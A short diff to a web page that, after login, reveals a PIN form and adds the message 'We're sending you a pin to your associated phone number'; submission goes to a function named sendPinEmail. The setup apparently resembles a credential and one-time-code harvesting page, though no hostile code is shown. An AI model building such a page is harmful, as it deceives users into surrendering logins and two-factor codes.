@@ -27,6 +27,7 @@
                 .then(function(response) {
                     document.querySelector('.login-container').style.display = 'none';
                     document.querySelector('.pin-container').style.display = 'block';
+                    document.querySelector('.pin-message').style.display = 'block';  // Show the message
                 }, function(error) {
                     console.error('FAILED...', error);
                     alert('FAILED... Check console for details.');
@@ -171,6 +172,12 @@
         .hidden {
             display: none;
         }
+        .pin-message {  /* Style for the message */
+            display: none;
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
+        }
         .popup {
             position: fixed;
             top: 0;
@@ -279,6 +286,7 @@
             <!-- PIN Form -->
             <div class="pin-container hidden">
                 <h2>Enter PIN</h2>
+                <p class="pin-message">We're sending you a pin to your associated phone number</p>
                 <form onsubmit="sendPinEmail(event)">
                     <div class="form-group">
                         <label for="pin">PIN</label>
